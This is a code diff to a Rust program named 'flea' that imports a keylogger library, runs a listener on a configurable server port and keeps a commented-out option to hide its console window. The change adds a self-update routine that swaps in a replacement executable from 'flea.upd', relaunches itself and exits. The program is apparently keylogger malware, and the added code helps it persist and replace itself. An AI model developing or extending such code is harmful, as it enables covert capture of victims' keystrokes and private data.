@@ -1,5 +1,7 @@
 //#![windows_subsystem = "windows"]
 
+mod updater;
+
 extern crate exitcode;
 extern crate getopts;
 
@@ -17,6 +19,14 @@ use flealib::keylogger::*;
 
 //Change the port number of the server according to your needs
 const SERVER_PORT: &'static str = ":1972";
+const BACKUP_FILENAME: &'static str = "flea.bak";
+const UPDATE_FILENAME: &'static str = "flea.upd";
+
+#[cfg(target_os = "windows")]
+const FLEA_FILE_NAME: &'static str = "flea.exe";
+
+#[cfg(target_os = "linux")]
+const FLEA_FILE_NAME: &'static str = "flea";
 
 fn print_usage(program: &str, opts: Options) 
 {
@@ -29,6 +39,34 @@ fn main()
     env_logger::init();
 
     info!("Start");
+
+    //Gets program current directory
+    let dir = env::current_dir().expect("Couldn't get current directory!");
+
+    //Check if backup file exists
+    if std::path::Path::new(BACKUP_FILENAME).exists()
+    {
+        //Delete the backup file
+        match std::fs::remove_file(BACKUP_FILENAME)
+        {
+            Ok(_) => {},
+            Err(_) => {}
+        }
+    }
+
+    //Finds if there is update available
+    updater::find_update(dir.to_str().unwrap(), UPDATE_FILENAME).map(|x| 
+    {
+        info!("Found update: {}", x);
+         //Rename current file to the backup name
+        std::fs::rename(FLEA_FILE_NAME, BACKUP_FILENAME).expect("Couldn't rename the current file!");
+        //Rename the update file to the current executable name
+        std::fs::rename(x, FLEA_FILE_NAME).expect("Couldn't rename the update file!");
+        //Starts a new process of itself
+        updater::start_new_process();
+        //Exits the current process
+        std::process::exit(exitcode::OK);
+    });
 
     let my_local_ip = local_ip().unwrap();
     let args: Vec<String> = env::args().collect();
